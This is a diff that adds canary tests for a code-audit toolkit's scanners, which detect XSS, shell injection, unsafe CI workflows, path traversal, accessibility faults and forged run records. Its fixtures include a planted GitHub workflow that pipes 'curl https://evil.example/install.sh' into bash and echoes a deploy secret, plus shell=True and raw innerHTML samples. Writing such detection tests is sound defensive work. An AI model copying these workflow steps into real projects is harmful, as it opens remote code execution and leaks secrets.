@@ -951,6 +951,226 @@ def run_all_metric_canaries() -> tuple[int, int, list[str]]:
         expect("Canário M70: assertless_scan reprova hit-and-swallow e aprova catch com asserção",
                code_sw == 1 and "HIT-AND-SWALLOW" in out_sw, out_sw.strip()[:100])
 
+        # ============ WAVE 5 — Banca Adversarial v4.0 (M71..M80) ============
+        from scripts.run_state import verify_run_file
+        from scripts.metricas.a11y_scan import scan_a11y_path
+        from scripts.metricas.mutant_hunt import run_mutant_hunt
+        from scripts.audit_ledger import verify_exec_log
+
+        # M71: hazard_scan escopo intraprocedural e precedência de offset (sanitizer em fn_a não isenta fn_b)
+        m71_bad = t / "m71_bad.ts"
+        m71_bad.write_text(
+            "// TODO: usar Semaphore e DOMPurify.sanitize\n"
+            "export function helper(x: string) {\n"
+            "  return DOMPurify.sanitize(x);\n"
+            "}\n"
+            "export async function renderUnsanitized(el: any, rawHtml: string, items: string[]) {\n"
+            "  el.innerHTML = rawHtml;\n"
+            "  await Promise.all(items.map(u => execFile('ffmpeg', [u])));\n"
+            "}\n",
+            encoding="utf-8")
+        _, fnds_m71_bad, _ = scan_path(m71_bad)
+        rules_m71_bad = {r for r, _, _, _ in fnds_m71_bad}
+        m71_ok = t / "m71_ok.ts"
+        m71_ok.write_text(
+            "const DOC_EXAMPLE = 'el.innerHTML = rawHtml';\n"
+            "export async function renderSafe(el: any, rawHtml: string, items: string[]) {\n"
+            "  const limit = pLimit(4);\n"
+            "  el.innerHTML = DOMPurify.sanitize(rawHtml);\n"
+            "  await Promise.all(items.map(u => limit(() => execFile('ffmpeg', [u]))));\n"
+            "}\n",
+            encoding="utf-8")
+        _, fnds_m71_ok, _ = scan_path(m71_ok)
+        expect("Canário M71: hazard_scan isola sanitizador/semáforo por função e ignora string literal de XSS",
+               "XSS-RAW-HTML" in rules_m71_bad and "UNBOUNDED-CONCURRENCY" in rules_m71_bad and fnds_m71_ok == [],
+               f"bad={rules_m71_bad} ok={fnds_m71_ok}")
+
+        # M72: hazard_scan bloqueia manifesto plantado em repo externo e flagra CI workflows perigosos
+        m72_ext = t / "m72_ext"
+        (m72_ext / "evals").mkdir(parents=True)
+        (m72_ext / "evals" / "hazard_fixtures_manifest.json").write_text(
+            json.dumps([{"file": "app.py", "rule": "SHELL-INJECTION", "reason": "plantado"}]),
+            encoding="utf-8")
+        (m72_ext / "app.py").write_text("import subprocess\nsubprocess.run(cmd, shell=True)\n", encoding="utf-8")
+        _, fnds_m72_ext, _ = scan_path(m72_ext / "app.py")
+        wf_dir = m72_ext / ".github" / "workflows"
+        wf_dir.mkdir(parents=True)
+        (wf_dir / "pwn.yml").write_text(
+            "on: [pull_request_target]\n"
+            "jobs:\n"
+            "  build:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - uses: actions/checkout@v4\n"
+            "        with:\n"
+            "          ref: ${{ github.event.pull_request.head.sha }}\n"
+            "      - run: curl -sSL https://evil.example/install.sh | bash\n"
+            "      - run: echo ${{ secrets.DEPLOY_TOKEN }}\n",
+            encoding="utf-8")
+        _, fnds_m72_wf, _ = scan_path(wf_dir / "pwn.yml")
+        rules_m72_wf = {r for r, _, _, _ in fnds_m72_wf}
+        expect("Canário M72: hazard_scan ignora manifesto plantado externo e flagra CI-PWN-REQUEST/CURL-PIPE-SH/SECRET-ECHO",
+               any(r == "SHELL-INJECTION" for r, _, _, _ in fnds_m72_ext)
+               and {"CI-PWN-REQUEST", "CI-CURL-PIPE-SH", "CI-SECRET-ECHO"} <= rules_m72_wf,
+               f"ext={fnds_m72_ext} wf={rules_m72_wf}")
+
+        # M73: metaconfig_diff detecta arquivo protegido untracked (??) e lockfile modificado
+        m73_repo = t / "m73_repo"
+        m73_repo.mkdir()
+        subprocess.run(["git", "init", "-q"], cwd=str(m73_repo), check=True)
+        subprocess.run(["git", "-c", "user.email=c@c", "-c", "user.name=c", "commit",
+                        "--allow-empty", "-qm", "base"], cwd=str(m73_repo), check=True)
+        (m73_repo / "conftest.py").write_text("import os\n", encoding="utf-8")
+        muts_m73, auth_m73 = check_metaconfig(m73_repo, "HEAD", None)
+        expect("Canário M73: metaconfig_diff reprova conftest.py untracked (??) como mutação não autorizada",
+               any("conftest.py" in m for m in muts_m73) and auth_m73 is True, str(muts_m73))
+
+        # M74: henke_router word-boundaries, verbos compostos e as 5 novas skills da Wave 5
+        c_comp, o_comp = run(ROUTER, "--prompt", "audita e corrige o bug no endpoint de pagamento")
+        r_comp = json.loads(o_comp) if c_comp == 0 else {}
+        c_banca, o_banca = run(ROUTER, "--prompt", "convoca uma banca adversarial todos contra todos para auditar")
+        r_banca = json.loads(o_banca) if c_banca == 0 else {}
+        c_mut, o_mut = run(ROUTER, "--prompt", "roda teste de mutação e mutant hunt para achar teste fraco")
+        r_mut = json.loads(o_mut) if c_mut == 0 else {}
+        c_perf, o_perf = run(ROUTER, "--prompt", "audita a performance e gargalo de query N+1")
+        r_perf = json.loads(o_perf) if c_perf == 0 else {}
+        c_llm, o_llm = run(ROUTER, "--prompt", "integra llm com structured output e proteção contra prompt injection")
+        r_llm = json.loads(o_llm) if c_llm == 0 else {}
+        c_obs, o_obs = run(ROUTER, "--prompt", "configura observabilidade com logs estruturados e tracing")
+        r_obs = json.loads(o_obs) if c_obs == 0 else {}
+        expect("Canário M74: henke_router trata verbo composto (audita e corrige -> EXECUTAR) e roteia as 5 novas skills",
+               r_comp.get("mode") == "EXECUTAR" and r_comp.get("archetype") == "CARPINTEIRO"
+               and any(s["name"] == "henke-audit-banca" for s in r_banca.get("skills", []))
+               and any(s["name"] == "henke-test-mutantes" for s in r_mut.get("skills", []))
+               and any(s["name"] == "henke-audit-perf" for s in r_perf.get("skills", []))
+               and any(s["name"] == "henke-code-llm" for s in r_llm.get("skills", []))
+               and any(s["name"] == "henke-ops-observa" for s in r_obs.get("skills", [])))
+
+        # M75: contract_closure bloqueia path traversal, variável apenas local/sem import e valida ROUTE:METHOD
+        m75_dir = t / "m75"
+        (m75_dir / "src").mkdir(parents=True)
+        (m75_dir / "src" / "a.py").write_text(
+            "def internal():\n    local_only = 123\n    return local_only\n", encoding="utf-8")
+        (m75_dir / "src" / "b.py").write_text(
+            "def other():\n    local_only = 456\n    return local_only\n", encoding="utf-8")
+        spec_m75_bad = m75_dir / "spec_bad.md"
+        spec_m75_bad.write_text(
+            "# S\n## 4. Escopo Declarado\n- `src/a.py`\n- `src/b.py`\n"
+            "## 5. Pontes de Contrato\n"
+            "- ponte: `../../outside.py::x -> src/b.py`\n"
+            "- ponte: `src/a.py::local_only -> src/b.py`\n",
+            encoding="utf-8")
+        ok_m75_bad, errs_m75_bad = check_contract_closure(spec_m75_bad, m75_dir)
+        (m75_dir / "src" / "api.py").write_text(
+            "@app.get('/api/users/{id}')\ndef get_user(id: str): return id\n", encoding="utf-8")
+        (m75_dir / "src" / "client.ts").write_text(
+            "export async function loadUser(id: string) { return fetch('/api/users/:id'); }\n", encoding="utf-8")
+        spec_m75_route = m75_dir / "spec_route.md"
+        spec_m75_route.write_text(
+            "# S\n## 4. Escopo Declarado\n- `src/api.py`\n- `src/client.ts`\n"
+            "## 5. Pontes de Contrato\n"
+            "- ponte: `src/api.py::\"ROUTE:GET /api/users/{id}\" -> src/client.ts`\n",
+            encoding="utf-8")
+        ok_m75_rt, errs_m75_rt = check_contract_closure(spec_m75_route, m75_dir)
+        expect("Canário M75: contract_closure reprova path traversal e variável local sem export/import e aprova ROUTE normalizada",
+               not ok_m75_bad and any("PATH-TRAVERSAL-BRIDGE" in e for e in errs_m75_bad)
+               and any("BROKEN-BRIDGE-SYMBOL-SRC" in e or "BROKEN-BRIDGE-IMPORT" in e for e in errs_m75_bad)
+               and ok_m75_rt, f"bad={errs_m75_bad} rt={errs_m75_rt}")
+
+        # M76: spec_drift bloqueia curinga puro (**/*) e aprova glob recursivo (src/**)
+        from scripts.spec_drift import check_spec_drift, compute_spec_hash, is_path_in_scope
+        m76_spec = m73_repo / "spec_wild.md"
+        m76_spec.write_text("# S\n## 4. Escopo Declarado\n- `**/*`\n", encoding="utf-8")
+        ok_m76, errs_m76 = check_spec_drift(m76_spec, expected_hash=compute_spec_hash(m76_spec), against="HEAD", git_root=m73_repo)
+        expect("Canário M76: spec_drift bloqueia curinga irrestrito (**/*) e suporta glob recursivo (src/**)",
+               not ok_m76 and any("WILDCARD-SCOPE-FORBIDDEN" in e for e in errs_m76)
+               and is_path_in_scope("src/deep/nested/file.py", ["src/**"]))
+
+        # M77: a11y_scan standalone reprova fraude .sr-only duplicado, aria-hidden focável e botão vazio, e aprova botão acessível
+        m77_dir = t / "m77_a11y"
+        m77_dir.mkdir()
+        (m77_dir / "Bad.tsx").write_text(
+            "export function Bad() {\n"
+            "  return (\n"
+            "    <div>\n"
+            "      <button>Salvar <span className=\"sr-only\">Salvar</span></button>\n"
+            "      <button aria-hidden=\"true\" tabIndex={0}>Secreto</button>\n"
+            "      <button><svg /></button>\n"
+            "    </div>\n"
+            "  );\n"
+            "}\n", encoding="utf-8")
+        (m77_dir / "Good.tsx").write_text(
+            "export function Good() {\n"
+            "  return <button aria-label=\"Fechar\"><svg /></button>;\n"
+            "}\n", encoding="utf-8")
+        _, fnds_a11y_bad = scan_a11y_path(m77_dir / "Bad.tsx")
+        _, fnds_a11y_good = scan_a11y_path(m77_dir / "Good.tsx")
+        a11y_rules = {r for r, _, _ in fnds_a11y_bad}
+        expect("Canário M77: a11y_scan reprova A11Y-SR-ONLY-DUPLICATE, A11Y-HIDDEN-INTERACTIVE e A11Y-EMPTY-CONTROL e aprova botão legítimo",
+               {"A11Y-SR-ONLY-DUPLICATE", "A11Y-HIDDEN-INTERACTIVE", "A11Y-EMPTY-CONTROL"} <= a11y_rules
+               and fnds_a11y_good == [], str(a11y_rules))
+
+        # M78: run_state reprova outcome=verified forjado quando portão falhou (STATE-DERIVED-CONFLICT) e aprova run íntegra
+        m78_bad = t / "run_bad.json"
+        m78_bad.write_text(json.dumps({
+            "run_id": "r1",
+            "mode": "EXECUTAR",
+            "archetype": "CARPINTEIRO",
+            "outcome": "verified",
+            "gates": {"hazard_scan": {"exit_code": 1}}
+        }), encoding="utf-8")
+        ok_r_bad, errs_r_bad = verify_run_file(m78_bad)
+        m78_ok = t / "run_ok.json"
+        m78_ok.write_text(json.dumps({
+            "run_id": "r2",
+            "mode": "EXECUTAR",
+            "archetype": "CARPINTEIRO",
+            "outcome": "verified",
+            "gates": {"hazard_scan": {"exit_code": 0}}
+        }), encoding="utf-8")
+        ok_r_ok, errs_r_ok = verify_run_file(m78_ok)
+        expect("Canário M78: run_state bloqueia outcome=verified forjado com STATE-DERIVED-CONFLICT e aprova run íntegra",
+               not ok_r_bad and any("STATE-DERIVED-CONFLICT" in e for e in errs_r_bad) and ok_r_ok and errs_r_ok == [])
+
+        # M79: mutant_hunt detecta mutante sobrevivente em teste fraco e 100% kill_rate em teste forte
+        m79_dir = t / "m79_mut"
+        m79_dir.mkdir()
+        calc_py = m79_dir / "calc.py"
+        calc_py.write_text("def soma(a, b):\n    return a + b\n", encoding="utf-8")
+        weak_test = m79_dir / "test_weak.py"
+        weak_test.write_text(
+            "import sys\nfrom pathlib import Path\nsys.path.insert(0, str(Path(__file__).parent))\n"
+            "from calc import soma\n"
+            "assert isinstance(soma(2, 3), int)\n", encoding="utf-8")
+        strong_test = m79_dir / "test_strong.py"
+        strong_test.write_text(
+            "import sys\nfrom pathlib import Path\nsys.path.insert(0, str(Path(__file__).parent))\n"
+            "from calc import soma\n"
+            "assert soma(2, 3) == 5\n", encoding="utf-8")
+        res_weak = run_mutant_hunt(calc_py, [sys.executable, str(weak_test)], max_mutants=5)
+        res_strong = run_mutant_hunt(calc_py, [sys.executable, str(strong_test)], max_mutants=5)
+        expect("Canário M79: mutant_hunt flagra mutante sobrevivente em teste fraco e mata 100% em teste forte preservando arquivo original",
+               res_weak["survived"] > 0 and res_strong["kill_rate"] == 100.0
+               and calc_py.read_text(encoding="utf-8") == "def soma(a, b):\n    return a + b\n",
+               f"weak={res_weak} strong={res_strong}")
+
+        # M80: henke_cli exec grava exec_log.jsonl hash-encadeado e verify_exec_log bloqueia adulteração de testes_descobertos
+        m80_dir = t / "m80_exec"
+        m80_dir.mkdir()
+        CLI_SCRIPT = repo_root / "scripts" / "henke_cli.py"
+        c_ex, o_ex = run(CLI_SCRIPT, "exec", "--repo", m80_dir, "--",
+                         sys.executable, "-c", "print('Ran 4 tests in 0.01s\\n\\nOK')")
+        exec_log_p = m80_dir / ".henke" / "exec_log.jsonl"
+        led_p = m80_dir / ".henke" / "LEDGER.json"
+        led_entries = json.loads(led_p.read_text(encoding="utf-8")) if led_p.is_file() else []
+        errs_valid_log = verify_exec_log(led_entries, exec_log_p)
+        tampered_entries = [{"cmd": led_entries[0]["cmd"], "exit": 0, "testes_descobertos": 999}] if led_entries else []
+        errs_tampered_log = verify_exec_log(tampered_entries, exec_log_p)
+        expect("Canário M80: henke exec grava exec_log.jsonl com stdout_sha256 e verify_exec_log bloqueia contagem adulterada",
+               c_ex == 0 and exec_log_p.is_file() and errs_valid_log == []
+               and any("UNVERIFIED_EXECUTION_EVIDENCE" in e for e in errs_tampered_log),
+               f"valid={errs_valid_log} tampered={errs_tampered_log}")
+
     return passed, total, reports
 
 
